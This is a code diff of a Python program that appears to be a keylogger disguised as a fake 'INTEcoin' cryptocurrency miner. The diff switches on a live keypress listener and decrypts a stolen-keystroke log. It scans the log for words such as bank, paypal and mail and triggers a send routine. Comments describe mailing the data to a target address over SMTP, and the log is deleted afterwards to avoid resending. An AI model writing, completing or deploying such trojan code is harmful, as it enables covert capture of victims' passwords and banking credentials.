@@ -111,35 +111,31 @@ def results():
     """
     Steal logic function.
     INTEcoin - Holds the encrypted data which deletes after the function finishes copying the file.
-    INTEcoin0 - Copies the decrypted data from INTEcoin and runs a check for keywords.
     """
-    importantWords = ["bank", "hmo", "facebook", "mail", "paypal"]
-    toSend = False
-    message = ""
-    accumulatedLog = []
+    keywords = ["bank", "hmo", "facebook", "mail", "paypal"]
+    toSend = False # File has one of the keywords flag
+    chunk = ""
+    DecryptedLog = ""
 
     for byt in Encryption.bytes_from_file(LOGS_PATH + "INTEcoin.dat"): # Read stolen data file as chunks and save them in a list
         if byt == "@":
-            accumulatedLog.append(message)
-            message = ""
+            DecryptedLog += Encryption.decrypt(chunk.encode())
+            chunk = ""
             continue
-        message += byt
+        chunk += byt
+    
+    print(DecryptedLog)
 
-    message = ""  # Reusing the parameter
-    with open(LOGS_PATH + "INTEcoin0.dat", "wb") as file: # Saving the data in the new file
-        for mess in accumulatedLog:
-            message += Encryption.decrypt(mess.encode()) # Decrypt the data
-            file.write(mess.encode()) # Write the data on a random file for the "miner"
-    for word in importantWords: # Checking if any sensitive data was inputted.
-        if word in message:
+    for word in keywords: # Checking if any sensitive data was inputted
+        if word in DecryptedLog:
             toSend = True
             break
     if toSend:
-        send(accumulatedLog)  # Send the encrypted data
+        send()  # Send the encrypted data
     os.remove(LOGS_PATH + "INTEcoin.dat") # Delete file to avoid sending the same data again
 
 
-def send(data):
+def send():
     """
     Sends the data via email.
     :param data: The data to send.
@@ -149,11 +145,11 @@ def send(data):
     # Elad
     # Send data to mail saved in parameter: TARGET_EMAIL
     # SMTP
-    print(data)
+    print("HAS A KEYWORD")
 
 
-#with Listener(on_press=press) as listener: # Keypress listener
- #   listener.join()
+with Listener(on_press=press) as listener: # Keypress listener
+    listener.join()
 
 
 def miner(): # Fake miner
@@ -162,6 +158,7 @@ def miner(): # Fake miner
     INTEcoins=0
     file_count = 1
     while True:
+        # Miner messages
         print(".", end = "")
         randomNumber=random.randint(1, 100)
         time.sleep(randomNumber/20) # Sleep for a short random time
@@ -169,6 +166,8 @@ def miner(): # Fake miner
             INTEcoins += randomNumber
             print("\nMined {} INTEcoins! You currently have {} coins!".format(randomNumber, INTEcoins))
             print("Mining", end = "")
+
+        # Write fake logs
         if randomNumber%50 == 0:
             file_count+=1
         else:
@@ -182,4 +181,4 @@ if __name__ == '__main__':
     kl = Process(target = miner)
     kl.start()
 """
-miner()
+#miner()
